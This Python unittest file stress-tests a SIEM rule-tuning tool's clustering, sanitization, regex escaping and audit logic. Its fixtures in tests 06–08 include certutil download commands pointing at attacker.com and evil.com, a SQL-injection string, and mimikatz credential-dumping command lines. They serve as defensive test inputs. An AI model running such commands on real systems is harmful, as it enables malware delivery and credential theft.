#!/usr/bin/env python3
"""
extreme_stress_test.py - Extreme Enterprise Stress, Concurrency & Chaos Suite for siem-rule-tuner.

Execution Vectors:
1. Massive 50,000 Alert Ingestion & Telemetry Clustering Benchmark
2. Memory Stability & Leak Detection over 20,000 Sustained Iterations
3. High-Core Thread Contention (32 Threads, 5,000 Concurrent Requests)
4. Giant Multi-Megabyte Telemetry Stream Parsing (10 MB Single JSON Payload)
5. Zero-Trust Sanitization Torture (10,000 IPs, FQDNs, Emails, and GUIDs)
6. Catastrophic Regex Backtracking (ReDoS) & Pathological PCRE2 Stress
7. Adversarial Chaos Stream (5,000 Mutated, Truncated, and Poisoned Alerts)
8. High-Velocity Rapid-Fire Rule Audit Benchmark (50,000 Micro-Audits)
"""

import concurrent.futures
import hashlib
import json
import os
import random
import re
import sys
import time
import tracemalloc
import unittest

BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
SCRIPTS_DIR = os.path.join(BASE_DIR, "scripts")
FIXTURES_DIR = os.path.join(BASE_DIR, "tests", "fixtures")
sys.path.insert(0, SCRIPTS_DIR)

from analyze_siem_fp import analyze_fp_alerts, extract_alert_attributes, sanitize_bundle, sanitize_text
from tune_siem_rule import (
    audit_blind_spot_risk,
    escape_wazuh_xml_regex,
    generate_defender_kql_exclusion,
    generate_wazuh_child_rule,
    tune_alerts_data
)


class TestSiemTunerExtremeStress(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        with open(os.path.join(FIXTURES_DIR, "fixture-wazuh-veeam-sysmon-fp.json"), "r", encoding="utf-8") as f:
            cls.veeam_fixture = json.load(f)
        with open(os.path.join(FIXTURES_DIR, "fixture-defender-intune-powershell-fp.json"), "r", encoding="utf-8") as f:
            cls.defender_fixture = json.load(f)

    def test_01_massive_50k_alert_clustering(self):
        """Vector 1: Cluster 50,000 realistic alerts in a single stream with performance assertion."""
        print("\n--- Vector 1: Massive 50,000 Alert Ingestion & Clustering ---")
        alerts = []
        base_veeam = self.veeam_fixture[0]
        base_def = self.defender_fixture[0]

        # Synthesize 50,000 alerts with 80% Veeam, 15% Intune, 5% miscellaneous
        for i in range(50000):
            if i % 10 < 8:
                alert = {
                    "timestamp": f"2026-11-09T08:{i % 60:02d}:00Z",
                    "rule": {"id": "60103", "description": "Sysmon process creation"},
                    "data": {"win": {"eventdata": {
                        "image": "C:\\Program Files\\Veeam\\Backup\\VeeamGuestHelper.exe",
                        "parentImage": "C:\\Windows\\System32\\services.exe",
                        "user": f"NT AUTHORITY\\SYSTEM_{i % 5}",
                        "commandLine": f"\"C:\\Program Files\\Veeam\\Backup\\VeeamGuestHelper.exe\" -runAsService -jobId {i}"
                    }}}
                }
            else:
                alert = {
                    "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "InitiatingProcessFolderPath": "C:\\Program Files (x86)\\Microsoft Intune Management Extension\\AgentExecutor.exe",
                    "AccountName": "SYSTEM",
                    "ProcessCommandLine": f"powershell.exe -executionpolicy bypass -file script_{i}.ps1",
                    "Title": "Suspicious PowerShell Execution",
                    "AlertId": "Def-Alert-77041"
                }
            alerts.append(alert)

        start = time.perf_counter()
        result = analyze_fp_alerts(alerts, "wazuh")
        elapsed = time.perf_counter() - start
        rate = len(alerts) / elapsed

        print(f"[*] Processed {len(alerts):,} alerts in {elapsed:.3f} seconds ({rate:,.0f} alerts/sec)")
        print(f"[*] Primary Noisy Rule: {result.get('primary_noisy_rule_id')}")
        print(f"[*] Primary Process Image: {result.get('primary_process_image')}")

        self.assertEqual(result.get("total_alerts_analyzed"), 50000)
        self.assertEqual(result.get("primary_noisy_rule_id"), "60103")
        self.assertIn("VeeamGuestHelper.exe", result.get("primary_process_image"))
        self.assertLess(elapsed, 3.5, "50k clustering took longer than 3.5 seconds")

    def test_02_memory_stability_20k_iterations(self):
        """Vector 2: Track memory allocation over 20,000 sustained tuning iterations (Zero Memory Leak)."""
        print("\n--- Vector 2: Memory Stability & Leak Detection (20,000 Iterations) ---")
        tracemalloc.start()
        
        # Warmup
        for _ in range(500):
            tune_alerts_data(self.veeam_fixture, "wazuh")

        snapshot_start = tracemalloc.take_snapshot()
        start_time = time.perf_counter()

        iterations = 20000
        for i in range(iterations):
            # Dynamic payload to defeat potential trivial memoization
            dynamic_alert = [{
                "rule": {"id": str(60000 + (i % 10))},
                "data": {"win": {"eventdata": {
                    "image": f"C:\\Program Files\\App_{i % 50}\\service.exe",
                    "parentImage": "C:\\Windows\\System32\\services.exe",
                    "user": "SYSTEM",
                    "commandLine": f"service.exe --worker {i}"
                }}}
            }]
            res = tune_alerts_data(dynamic_alert, "wazuh", new_rule_id=100000 + (i % 500))
            if not res["approved"]:
                self.fail(f"Iteration {i} unexpectedly rejected")

        elapsed = time.perf_counter() - start_time
        snapshot_end = tracemalloc.take_snapshot()
        tracemalloc.stop()

        top_stats = snapshot_end.compare_to(snapshot_start, "lineno")
        total_growth_bytes = sum(stat.size_diff for stat in top_stats)
        growth_mb = total_growth_bytes / (1024 * 1024)
        throughput = iterations / elapsed

        print(f"[*] Completed {iterations:,} iterations in {elapsed:.3f}s ({throughput:,.0f} evals/sec)")
        print(f"[*] Memory Net Growth: {growth_mb:.3f} MB over {iterations:,} cycles")

        # Memory growth must remain strictly below 3.0 MB across 20k dynamic allocations
        self.assertLess(growth_mb, 3.0, f"Memory leak detected: growth was {growth_mb:.2f} MB")

    def test_03_high_core_thread_contention(self):
        """Vector 3: Execute 5,000 concurrent requests across 32 threads with zero race conditions."""
        print("\n--- Vector 3: High-Core Thread Contention (32 Threads, 5,000 Requests) ---")
        workers = 32
        requests_count = 5000

        def concurrent_task(index):
            if index % 2 == 0:
                payload = self.veeam_fixture
                platform = "wazuh"
            else:
                payload = self.defender_fixture
                platform = "defender"
            return tune_alerts_data(payload, platform, new_rule_id=200000 + index)

        start = time.perf_counter()
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(concurrent_task, i) for i in range(requests_count)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]

        elapsed = time.perf_counter() - start
        throughput = requests_count / elapsed

        print(f"[*] Completed {requests_count:,} concurrent audits across {workers} threads in {elapsed:.3f}s")
        print(f"[*] Concurrent Throughput: {throughput:,.0f} requests/sec")

        self.assertEqual(len(results), requests_count)
        for r in results:
            self.assertTrue(r["approved"])
            self.assertEqual(r["tuning_disposition"], "APPROVED")
            self.assertTrue(len(r["production_rule_code"]) > 0)

    def test_04_giant_10mb_telemetry_stream(self):
        """Vector 4: Parse and sanitize a giant 10 megabyte single telemetry alert stream."""
        print("\n--- Vector 4: Giant 10 MB Single Telemetry Stream Parsing ---")
        # Build 10 MB payload by repeating verbose records with 4,000 character command lines
        large_records = []
        long_arg = " -param " + ("A" * 200) + " "
        huge_cmd = "C:\\Program Files\\Enterprise\\Agent.exe" + (long_arg * 15)

        for i in range(2500):
            large_records.append({
                "EventID": 1,
                "UtcTime": "2026-11-09 09:00:00.000",
                "ProcessGuid": f"{{{i:08d}-0000-0000-0000-000000000000}}",
                "ProcessId": i,
                "Image": "C:\\Program Files\\Enterprise\\Agent.exe",
                "CommandLine": huge_cmd,
                "CurrentDirectory": "C:\\Program Files\\Enterprise\\",
                "User": f"CORP\\svc_agent_{i % 10}",
                "LogonGuid": "{00000000-1111-2222-3333-444444444444}",
                "LogonId": "0x12345",
                "TerminalSessionId": 0,
                "IntegrityLevel": "System",
                "Hashes": "SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                "ParentProcessGuid": "{00000000-9999-8888-7777-666666666666}",
                "ParentProcessId": 4,
                "ParentImage": "C:\\Windows\\System32\\services.exe",
                "ParentCommandLine": "C:\\Windows\\System32\\services.exe",
                "RuleName": "-",
                "RuleId": "10050"
            })

        payload_bytes = len(json.dumps(large_records).encode("utf-8"))
        payload_mb = payload_bytes / (1024 * 1024)
        print(f"[*] Generated payload size: {payload_mb:.2f} MB ({len(large_records):,} alert items)")

        start = time.perf_counter()
        sanitized = sanitize_bundle(large_records)
        elapsed_san = time.perf_counter() - start

        start_tune = time.perf_counter()
        tuned = tune_alerts_data(sanitized, "wazuh")
        elapsed_tune = time.perf_counter() - start_tune

        print(f"[*] Sanitized {payload_mb:.2f} MB in {elapsed_san:.3f}s ({(payload_mb / elapsed_san):.1f} MB/s)")
        print(f"[*] Tuned 10 MB alert batch in {elapsed_tune:.3f}s")

        self.assertTrue(tuned["approved"])
        self.assertEqual(tuned["extracted_attributes"]["image_path"], "C:\\Program Files\\Enterprise\\Agent.exe")

    def test_05_zero_trust_sanitization_torture(self):
        """Vector 5: Sanitize 10,000 distinct IPs, FQDNs, emails, and usernames without leaks."""
        print("\n--- Vector 5: Zero-Trust Sanitization Torture (10,000 Entities) ---")
        raw_bundle = {
            "ips": [f"10.{i // 65536}.{(i // 256) % 256}.{i % 256}" for i in range(2500)],
            "emails": [f"user_{i}@division_{i % 50}.corp.example.internal" for i in range(2500)],
            "fqdns": [f"server-{i}.infra.datacenter.internal" for i in range(2500)],
            "users": [f"admin_account_{i}" for i in range(2500)]
        }

        start = time.perf_counter()
        pass1 = sanitize_bundle(raw_bundle)
        elapsed_pass1 = time.perf_counter() - start

        # Check for absolute zero raw IP or email leakage
        pass1_str = json.dumps(pass1)
        self.assertNotIn("division_", pass1_str)
        self.assertNotIn("datacenter.internal", pass1_str)
        self.assertNotIn("admin_account_", pass1_str)

        # Confirm all IPs mapped to RFC 5737
        for ip in pass1["ips"]:
            self.assertTrue(ip.startswith("192.0.2."), f"IP not in RFC 5737 block: {ip}")

        # Strict idempotency check (pass 2 must match pass 1 exactly)
        start_pass2 = time.perf_counter()
        pass2 = sanitize_bundle(pass1)
        elapsed_pass2 = time.perf_counter() - start_pass2

        self.assertEqual(pass1, pass2, "Sanitization is not idempotent on second pass")
        print(f"[*] Sanitized 10,000 entities in {elapsed_pass1:.3f}s (Idempotency verified in {elapsed_pass2:.3f}s)")

    def test_06_catastrophic_redos_and_pathological_pcre2(self):
        """Vector 6: Stress regex parsers and XML builders against 10,000 pathological patterns."""
        print("\n--- Vector 6: Catastrophic ReDoS & Pathological PCRE2 Stress ---")
        pathological_patterns = [
            # Repeated nested groups that cause exponential backtracking in vulnerable engines
            "a" * 5000 + "!" * 500,
            ("foo" * 200) + ".*" + ("bar" * 200),
            "C:\\" + ("Windows\\System32\\" * 100) + "cmd.exe",
            "\\\\?\\Volume{b75e2c83-0000-0000-0000-602f00000000}\\" + ("dir\\" * 200) + "app.exe",
            "powershell.exe -enc " + ("A" * 4000) + "==",
            "cmd.exe /c " + ("echo " * 300) + "%PATH%",
            "<group><rule id=\"1\"><if_sid>1</if_sid></rule></group>" * 50,
            "'; DROP TABLE alerts; SELECT * FROM audit WHERE id = '" + (" OR '1'='1" * 50),
            "C:\\Program Files (x86)\\Application\\bin\\..\\..\\..\\Windows\\System32\\calc.exe",
            "certutil.exe -urlcache -split -f " + ("http://attacker.com/" * 50) + "payload.exe"
        ]

        start = time.perf_counter()
        iterations = 1000  # 1,000 iterations over 10 pathological cases = 10,000 micro-tests
        for _ in range(iterations):
            for pat in pathological_patterns:
                escaped_xml = escape_wazuh_xml_regex(pat)
                self.assertIsNotNone(escaped_xml)
                kql = generate_defender_kql_exclusion(pat, "C:\\parent.exe", "SYSTEM", pat)
                self.assertIsNotNone(kql)

        elapsed = time.perf_counter() - start
        tests_count = iterations * len(pathological_patterns)
        rate = tests_count / elapsed

        print(f"[*] Completed {tests_count:,} pathological regex & PCRE2 escapes in {elapsed:.3f}s ({rate:,.0f} ops/sec)")
        self.assertLess(elapsed, 1.5, "ReDoS resistance check exceeded 1.5 seconds")

    def test_07_adversarial_chaos_stream(self):
        """Vector 7: Inject 5,000 mutated, corrupted, and poisoned alerts into tuning engine."""
        print("\n--- Vector 7: Adversarial Chaos Stream (5,000 Mutated Alerts) ---")
        chaos_types = [
            None,
            {},
            [],
            {"corrupt_key": 99999},
            {"rule": None, "data": None},
            {"rule": {"id": ""}, "data": {"win": {"eventdata": {"image": None}}}},
            {"data": "non_dict_string_payload"},
            {"rule": {"id": 12345}, "data": {"win": {"eventdata": {"image": 0xDEADBEEF}}}},
            {"FolderPath": None, "InitiatingProcessFolderPath": 123},
            {"rule": {"id": "60103"}, "data": {"win": {"eventdata": {
                "image": "C:\\Windows\\System32\\certutil.exe",
                "parentImage": "C:\\Windows\\explorer.exe",
                "commandLine": "-urlcache -split -f http://evil.com/x.exe"
            }}}},
            {"rule": {"id": "60200"}, "data": {"win": {"eventdata": {
                "image": "C:\\Users\\Public\\mimikatz.exe",
                "parentImage": "C:\\Windows\\System32\\cmd.exe",
                "commandLine": "mimikatz.exe \"sekurlsa::logonpasswords\""
            }}}}
        ]

        start = time.perf_counter()
        chaos_count = 5000
        rejected_or_handled = 0

        for i in range(chaos_count):
            item = chaos_types[i % len(chaos_types)]
            # Must never raise uncaught exception
            try:
                res = tune_alerts_data(item, "wazuh")
                self.assertIsInstance(res, dict)
                if not res.get("approved"):
                    rejected_or_handled += 1
            except Exception as e:
                self.fail(f"Uncaught exception on chaos item {i}: {type(e).__name__}: {e}")

        elapsed = time.perf_counter() - start
        rate = chaos_count / elapsed

        print(f"[*] Successfully processed {chaos_count:,} chaos items in {elapsed:.3f}s ({rate:,.0f} items/sec)")
        print(f"[*] Safely Rejected or Guarded: {rejected_or_handled:,} / {chaos_count:,}")
        self.assertEqual(rejected_or_handled, chaos_count)

    def test_08_high_velocity_rule_audit_benchmark(self):
        """Vector 8: Benchmark 50,000 rapid-fire detection engineering policy audits."""
        print("\n--- Vector 8: High-Velocity Rapid-Fire Rule Audit Benchmark (50,000 Audits) ---")
        test_tuples = [
            ("C:\\Program Files\\App\\agent.exe", "C:\\Windows\\System32\\services.exe", "-service", "SYSTEM", 4, True),
            ("C:\\Windows\\System32\\certutil.exe", "C:\\Windows\\explorer.exe", "-f", "user", 3, False),
            ("C:\\Windows\\System32\\powershell.exe", "C:\\Tools\\unknown.exe", "", "admin", 2, False),
            ("C:\\Users\\Public\\mimikatz.exe", "C:\\Windows\\System32\\cmd.exe", "privilege::debug", "admin", 4, False),
            ("C:\\Tools\\broad.exe", "Unknown", "", "Unknown", 1, False)
        ]

        start = time.perf_counter()
        iterations = 10000  # 10,000 * 5 = 50,000 audits
        for _ in range(iterations):
            for img, pimg, cmd, usr, attrs, expected_approved in test_tuples:
                approved, defects, disp = audit_blind_spot_risk(img, pimg, cmd, usr, attrs)
                if approved != expected_approved:
                    self.fail(f"Audit mismatch for {img}: expected {expected_approved}, got {approved}")

        elapsed = time.perf_counter() - start
        total_audits = iterations * len(test_tuples)
        rate = total_audits / elapsed

        print(f"[*] Evaluated {total_audits:,} discrete rule audits in {elapsed:.3f}s ({rate:,.0f} audits/sec)")
        self.assertGreater(rate, 20000, f"Audit throughput {rate:,.0f} below 20,000 target")


if __name__ == "__main__":
    unittest.main()

